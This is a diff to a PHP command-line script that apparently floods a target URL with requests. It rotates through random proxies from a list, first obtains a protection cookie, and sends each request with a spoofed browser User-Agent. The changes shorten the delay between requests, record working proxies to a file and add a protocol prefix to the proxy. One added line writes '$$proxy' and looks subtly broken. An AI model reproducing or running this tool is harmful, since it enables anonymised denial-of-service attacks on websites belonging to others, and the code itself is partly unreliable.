@@ -12,7 +12,7 @@ error_reporting(0);
 $url = $argv[1];
 $requests = $argv[2]; if($requests == null) { $requests = "5"; }
 $timeout = $argv[3]; if($timeout == null) { $timeout = "3"; }
-$delay = $argv[4]; if($delay == null) { $delay = "3"; }
+$delay = $argv[4]; if($delay == null) { $delay = "2"; }
 $file = $argv[5]; if($file == null) { $file = "proxies.txt"; }
 $type = $argv[6];
 
@@ -66,7 +66,7 @@ for ($x = 1; $x <= 30; $x++) {
 	
 	//Grabbing the proxy
 	$f_contents = file($file);
-    $proxy = $f_contents[rand(0, count($f_contents) - 1)];
+    	$proxy = $f_contents[rand(0, count($f_contents) - 1)];
 	$proxy = preg_replace('/\s+/', '', $proxy);
 	if($proxy == null){ 
 		echo "[-] Failed to load proxy list! Ending...\n";
@@ -140,6 +140,12 @@ if($secret == null) {
 	die();
 } else {
 	echo "[+] Found cookie: $secret\n";
+	
+	$file = "working_$type.txt";
+	$f    = fopen($file, 'a');
+	fwrite($f, "$$proxy\n");
+	fclose($f);
+	
 }
 
 echo "[+] Sending $requests requests to $url\n";
@@ -150,7 +156,7 @@ echo "----------------------------------------------\n";
 for ($x = 1; $x <= $requests; $x++) {
 		
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_PROXY, $proxy);
+	curl_setopt($ch, CURLOPT_PROXY, ''.$protocol.''.$proxy.'');
 	curl_setopt($ch, CURLOPT_URL, $url . '/' . $payload);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
